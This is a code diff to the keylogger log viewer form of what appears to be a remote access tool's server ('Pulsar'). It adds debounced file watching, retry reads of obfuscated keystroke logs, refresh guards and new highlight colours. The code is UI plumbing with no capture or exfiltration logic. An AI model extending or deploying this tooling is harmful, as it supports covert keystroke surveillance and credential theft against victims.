@@ -23,7 +23,7 @@ namespace Pulsar.Server.Forms
         private readonly Client _connectClient;
         private readonly KeyloggerHandler _keyloggerHandler;
         private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();
-
+        private bool _isRefreshingLog = false;
         private readonly Timer _autoRefreshTimer = new();
         private readonly object _contentLock = new();
         private StringBuilder _currentLogCache = new();
@@ -60,24 +60,47 @@ namespace Pulsar.Server.Forms
             InitializeFileWatcher();
         }
 
+        private DateTime _lastWatcherEvent = DateTime.MinValue;
+        private readonly TimeSpan _watcherCooldown = TimeSpan.FromMilliseconds(250);
+
         private void InitializeFileWatcher()
         {
             _fileWatcher = new FileSystemWatcher
             {
                 Path = Path.GetTempPath(),
                 Filter = "*.txt",
-                NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
-                EnableRaisingEvents = false
+                // expanded to prevent missed/duplicate events
+                NotifyFilter = NotifyFilters.LastWrite
+                              | NotifyFilters.Size
+                              | NotifyFilters.FileName
+                              | NotifyFilters.CreationTime,
+                EnableRaisingEvents = false,
+                IncludeSubdirectories = false
             };
+
+            // prevent “buffer overflow” events on fast updates
+            _fileWatcher.InternalBufferSize = 64 * 1024;
+
             _fileWatcher.Changed += async (s, e) =>
             {
-                if (e.FullPath == _currentWatchedFile)
-                {
-                    await Task.Delay(50); // ensure write completed
-                    SafeInvoke(RefreshSelectedLog);
-                }
+                if (e.FullPath != _currentWatchedFile)
+                    return;
+
+                var now = DateTime.UtcNow;
+
+                // Prevent watcher spam when Windows fires multiple events for one write
+                if (now - _lastWatcherEvent < _watcherCooldown)
+                    return;
+
+                _lastWatcherEvent = now;
+
+                // Wait for the writing process to close its handle
+                await Task.Delay(50);
+
+                SafeInvoke(RefreshSelectedLog);
             };
         }
+
 
         private void AutoRefreshTimer_Tick(object sender, EventArgs e)
         {
@@ -101,13 +124,25 @@ namespace Pulsar.Server.Forms
             _keyloggerHandler.ProgressChanged -= LogsChanged;
             _connectClient.ClientState -= ClientDisconnected;
         }
+        private void LogsChanged(object sender, string message)
+        {
+            var now = DateTime.UtcNow;
+
+            if (now - _lastLogRefresh < _logRefreshCooldown)
+                return; // ignore spam events
+
+            _lastLogRefresh = now;
+
+            SafeInvoke(RefreshLogsDirectory);
+        }
 
         private void ClientDisconnected(Client client, bool connected)
         {
             if (!connected) SafeInvoke(Close);
         }
 
-        private void LogsChanged(object sender, string message) => SafeInvoke(RefreshLogsDirectory);
+        private DateTime _lastLogRefresh = DateTime.MinValue;
+        private readonly TimeSpan _logRefreshCooldown = TimeSpan.FromMilliseconds(500);  // tune as needed
 
         private void FrmKeylogger_Load(object sender, EventArgs e)
         {
@@ -131,7 +166,7 @@ namespace Pulsar.Server.Forms
             if (lstLogs.Items.Count > 0)
             {
                 lstLogs.Items[0].Selected = true;
-                lstLogs.Focus();
+                //lstLogs.Focus();
                 UpdateFileWatcher();
                 RefreshSelectedLog();
             }
@@ -191,9 +226,17 @@ namespace Pulsar.Server.Forms
                     if (!string.IsNullOrEmpty(previous))
                     {
                         var item = lstLogs.Items.Cast<ListViewItem>().FirstOrDefault(i => i.Text == previous);
-                        if (item != null) { item.Selected = true; lstLogs.Focus(); }
+                        if (item != null)
+                        {
+                            item.Selected = true;
+                            // DO NOT call lstLogs.Focus() here
+                        }
                     }
-                    else if (lstLogs.Items.Count > 0) { lstLogs.Items[0].Selected = true; lstLogs.Focus(); }
+                    else if (lstLogs.Items.Count > 0)
+                    {
+                        lstLogs.Items[0].Selected = true;
+                        // DO NOT call lstLogs.Focus() here
+                    }
 
                     UpdateFileWatcher();
                 }
@@ -203,26 +246,13 @@ namespace Pulsar.Server.Forms
                 }
             });
         }
-        private string CleanWindowTitle(string title)
-{
-    if (string.IsNullOrWhiteSpace(title))
-        return title;
-
-    // Remove anything after " - " which browsers append
-    int dashIndex = title.IndexOf(" - ");
-    if (dashIndex > 0)
-        title = title.Substring(0, dashIndex);
-
-    // Remove accidental trailing letters like "dwdwdw"
-    title = Regex.Replace(title, @"[a-zA-Z]{3,}$", "");
-
-    // Trim whitespace
-    return title.Trim();
-}
 
         private void RefreshSelectedLog()
         {
+            if (_isRefreshingLog) return;   // prevents overlapping refreshes
             if (lstLogs.SelectedItems.Count == 0) return;
+
+            _isRefreshingLog = true;
 
             string logFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
 
@@ -237,47 +267,62 @@ namespace Pulsar.Server.Forms
                             rtbLogViewer.Text = "Log file not found.";
                             ForceScrollToBottom();
                         });
+
+                        _isRefreshingLog = false;
                         return;
                     }
 
+                    // Read with retry protection
                     string content = await ReadFileWithRetryAsync(logFile);
-                    if (content == null) return;
+                    if (content == null)
+                    {
+                        _isRefreshingLog = false;
+                        return;
+                    }
 
+                    // -----------------------------
+                    // ⭐ FIX #5 IS RIGHT HERE ⭐
+                    // -----------------------------
+                    if (content == _currentLogCache.ToString())
+                    {
+                        SafeInvoke(ForceScrollToBottom);
+                        _isRefreshingLog = false;
+                        return;
+                    }
+
+                    // Heavy processing only if content changed
                     content = FilterAndDeduplicateLog(content);
                     content = MergeBrokenLines(content);
                     content = EnsureHeadersOnNewLine(content);
 
+
                     lock (_contentLock)
                     {
-                        if (content != _currentLogCache.ToString())
+                        // Update cache
+                        _currentLogCache.Clear();
+                        _currentLogCache.Append(content);
+
+                        SafeInvoke(() =>
                         {
-                            _currentLogCache.Clear();
-                            _currentLogCache.Append(content);
+                            // prevent flickering
+                            rtbLogViewer.SuspendLayout();
+                            rtbLogViewer.ReadOnly = true;
 
-                            SafeInvoke(() =>
-                            {
-                                // Suspend layout to prevent visual jumps
-                                rtbLogViewer.SuspendLayout();
+                            rtbLogViewer.Text = _currentLogCache.ToString();
+                            HighlightSpecialKeys();
 
-                                rtbLogViewer.Text = _currentLogCache.ToString();
-                                HighlightSpecialKeys();
+                            // scroll to bottom
+                            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
+                            rtbLogViewer.ScrollToCaret();
+                            NativeMethods.SendMessage(
+                                rtbLogViewer.Handle,
+                                NativeMethods.WM_VSCROLL,
+                                (IntPtr)NativeMethods.SB_BOTTOM,
+                                IntPtr.Zero);
 
-                                // Aggressive scroll to bottom
-                                rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
-                                rtbLogViewer.ScrollToCaret();
-
-                                // Windows API call as backup
-                                NativeMethods.SendMessage(rtbLogViewer.Handle, NativeMethods.WM_VSCROLL,
-                                    (IntPtr)NativeMethods.SB_BOTTOM, IntPtr.Zero);
-
-                                rtbLogViewer.ResumeLayout();
-                            });
-                        }
-                        else
-                        {
-                            // Even when content doesn't change, ensure we're at bottom
-                            SafeInvoke(ForceScrollToBottom);
-                        }
+                            rtbLogViewer.ReadOnly = false;
+                            rtbLogViewer.ResumeLayout();
+                        });
                     }
                 }
                 catch (Exception ex)
@@ -287,6 +332,10 @@ namespace Pulsar.Server.Forms
                         rtbLogViewer.Text = $"Error loading log: {ex.Message}";
                         ForceScrollToBottom();
                     });
+                }
+                finally
+                {
+                    _isRefreshingLog = false; // ALWAYS release lock
                 }
             });
         }
@@ -316,11 +365,37 @@ namespace Pulsar.Server.Forms
         {
             for (int i = 0; i < maxRetries; i++)
             {
-                try { return await FileHelper.ReadObfuscatedLogFileAsync(path); }
-                catch (IOException) when (i < maxRetries - 1) { await Task.Delay(50); }
+                try
+                {
+                    return await FileHelper.ReadObfuscatedLogFileAsync(path);
+                }
+                catch (IOException ex) when (i < maxRetries - 1)
+                {
+                    // Windows error code for "file is being used by another process"
+                    const int ERROR_SHARING_VIOLATION = unchecked((int)0x80070020);
+                    const int ERROR_LOCK_VIOLATION = unchecked((int)0x80070021);
+
+                    // If the file is locked by writer, wait a moment then retry
+                    if (ex.HResult == ERROR_SHARING_VIOLATION ||
+                        ex.HResult == ERROR_LOCK_VIOLATION)
+                    {
+                        await Task.Delay(50);
+                        continue;
+                    }
+
+                    // Other IOExceptions: still retry but delay a bit
+                    await Task.Delay(50);
+                }
+                catch
+                {
+                    // Non-IO exceptions: no retry
+                    break;
+                }
             }
-            return null;
+
+            return null; // failed after all retries
         }
+
 
         // ------------------ LOG PROCESSING ------------------
 
@@ -427,16 +502,20 @@ namespace Pulsar.Server.Forms
             foreach (Match match in headerRegex.Matches(text))
             {
                 rtbLogViewer.Select(match.Index, match.Length);
-                rtbLogViewer.SelectionColor = Color.LimeGreen;
+                rtbLogViewer.SelectionColor = Color.DodgerBlue;  // ← better for light + dark
             }
+
 
             var specialKeyRegex = new Regex(@"\[[^\]]+\]");
             foreach (Match match in specialKeyRegex.Matches(text))
             {
-                if (headerRegex.Matches(text).Cast<Match>().Any(h => match.Index >= h.Index && match.Index < h.Index + h.Length)) continue;
+                if (headerRegex.Matches(text).Cast<Match>().Any(h => match.Index >= h.Index && match.Index < h.Index + h.Length))
+                    continue;
+
                 rtbLogViewer.Select(match.Index, match.Length);
-                rtbLogViewer.SelectionColor = Color.Gold;
+                rtbLogViewer.SelectionColor = Color.OrangeRed;   // ★ better contrast for light mode
             }
+
 
             rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
             rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
@@ -461,12 +540,12 @@ namespace Pulsar.Server.Forms
                 if (lstLogs.Items.Count > 0)
                 {
                     lstLogs.Items[0].Selected = true;
-                    lstLogs.Focus();
+                    //lstLogs.Focus();
                     UpdateFileWatcher();
                     RefreshSelectedLog();
                 }
                 _autoRefreshTimer.Start();
-                _fileWatcher.EnableRaisingEvents = true;
+                _fileWatcher.EnableRaisingEvents = checkBox1.Checked && lstLogs.SelectedItems.Count > 0;
             }
             else
             {
